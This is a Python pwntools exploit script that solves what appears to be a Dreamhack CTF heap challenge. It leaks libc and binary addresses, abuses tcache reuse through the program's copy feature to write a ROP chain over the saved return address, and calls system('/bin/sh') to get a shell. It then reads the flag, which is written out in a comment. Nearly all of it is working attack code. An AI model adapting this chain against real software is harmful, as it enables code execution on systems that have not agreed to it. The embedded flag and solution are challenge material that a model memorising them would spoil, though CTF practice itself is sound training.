#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 12855

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x167e
brva 0x1322
brva 0x1439
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe_path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def make(idx, size, data):
    sla(b'>> ', b'1')
    sla(b'>> ', str(idx).encode())
    sla(b'>> ', str(size).encode())
    sa(b'>> ', data)
def copy(src, dst):
    sla(b'>> ', b'2')
    sla(b'>> ', str(src).encode())
    sla(b'>> ', str(dst).encode())
def delete(idx):
    sla(b'>> ', b'3')
    sla(b'>> ', str(idx).encode())
def change(username):
    sla(b'>> ', b'4')
    sa(b'>> ', username)

sa(b'what is your name?\n', b'\n')
libc.address = u64(p.recv(6).ljust(8, b'\x00'))-0x1f0f0a
log.success(f'libc base: {hex(libc.address)}')

change(b'M'*0x8)
rcu(b'M'*0x8)
exe.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x17d0
log.success(f'binary base: {hex(exe.address)}')

change(b'N'*0x20)
rcu(b'N'*0x20)
srip = u64(p.recv(6).ljust(8, b'\x00')) - 0x138 + 0x50
log.success(f'saved rip: {hex(srip)}')

ret_addr = exe.address + 0x1808
pop_rdi = 0x0000000000001833 + exe.address
ret = 0x000000000000101a + exe.address
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
root = exe.sym.root

make(1, 0x18, b'A'*0x18)
make(2, 0x18, b'B'*0x18)
delete(1)
delete(2)

make(1, 0x88, p64(pop_rdi))
make(2, 0x18, p32(0x3) + p32(0x10) + p64(srip))
copy(1, 3)

delete(2)
delete(1)
make(1, 0x88, p64(binsh))
make(2, 0x18, p32(0x3) + p32(0x10) + p64(srip+0x8))
copy(1, 3)

delete(2)
delete(1)
make(1, 0x88, p64(ret))
make(2, 0x18, p32(0x3) + p32(0x10) + p64(srip+0x10))
copy(1, 3)

delete(2)
delete(1)
make(1, 0x88, p64(system))
make(2, 0x18, p32(0x3) + p32(0x10) + p64(srip+0x18))
copy(1, 3)

sla(b'>> ', b'5')
sl(b'cat flag*') 
# DH{I_Can't_Understand_Why_Tcache_Exist}
p.interactive()
